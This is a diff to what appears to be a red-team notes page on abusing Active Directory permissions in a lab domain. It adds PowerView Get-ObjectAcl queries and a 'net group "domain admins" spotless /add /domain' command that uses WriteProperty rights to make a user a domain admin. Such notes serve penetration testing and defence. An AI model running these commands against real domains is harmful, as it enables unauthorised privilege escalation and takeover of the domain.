@@ -78,7 +78,25 @@ net user spotless /domain; Add-NetGroupUser -UserName spotless -GroupName "domai
 
 ![](../../.gitbook/assets/screenshot-from-2018-11-08-11-25-23.png)
 
+### WriteProperty \(Self-Membership\)
+
+```csharp
+Get-ObjectAcl -ResolveGUIDs | ? {$_.objectdn -eq "CN=Domain Admins,CN=Users,DC=offense,DC=local" -and $_.IdentityReference -eq "OFFENSE\spotless"}
+```
+
+![](../../.gitbook/assets/screenshot-from-2018-11-08-15-21-35.png)
+
+```csharp
+net group "domain admins" spotless /add /domain
+```
+
+![](../../.gitbook/assets/screenshot-from-2018-11-08-15-22-50.png)
+
 ### **ForceChangePassword**
+
+```csharp
+Get-ObjectAcl -SamAccountName delegate -ResolveGUIDs | ? {$_.IdentityReference -eq "OFFENSE\spotless"}
+```
 
 ![](../../.gitbook/assets/screenshot-from-2018-11-08-12-30-11.png)
 
